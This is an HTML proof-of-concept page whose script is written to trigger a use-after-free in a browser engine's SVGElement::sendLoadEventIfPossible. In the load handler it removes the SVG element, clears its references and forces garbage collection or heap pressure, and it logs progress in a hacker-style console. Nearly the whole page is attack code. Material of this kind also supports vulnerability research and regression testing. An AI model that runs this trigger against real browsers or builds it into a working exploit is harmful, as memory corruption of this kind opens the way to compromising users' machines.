<!DOCTYPE html>
<html>
<head>
<style>
body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:8px; }
.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; } .warn { color:#ff0; }
</style>
</head>
<body>
<div id="log"></div>
<div id="container"></div>

<script>
function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}

log("=== SVGElement sendLoadEventIfPossible USE-AFTER-FREE ===", "info");
log("[*] Setting up SVG load event trigger...", "info");

let container = document.getElementById("container");

// Create an SVG element that will trigger load event processing
let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
svg.setAttribute("id", "target_svg");

// Listen for the load event on the SVG element
svg.addEventListener("load", (e) => {
    log("[!] LOAD EVENT FIRED! Execution is inside SVGElement::sendLoadEventIfPossible()", "warn");
    log("[!] Removing SVG element from DOM and clearing references to FREE it...", "hit");
    
    // Remove from DOM tree and drop JS reference
    container.removeChild(svg);
    svg = null;
    
    // Trigger garbage collection to reclaim the freed C++ SVGElement
    if (window.gc) {
        window.gc();
        log("[*] Forced Garbage Collection", "info");
    } else {
        // Fallback heap pressure allocation
        for (let i = 0; i < 10000; i++) {
            let buf = new ArrayBuffer(128);
        }
    }
    
    log("[*] Returning from JS handler to C++ event dispatch stack frame...", "info");
});

log("[*] Appending SVG element to document...", "info");
container.appendChild(svg);

setTimeout(() => {
    log("[*] Execution complete. If target engine lacks protectedThis, UAF occurred during stack unwind.", "info");
}, 1000);
</script>
</body>
</html>
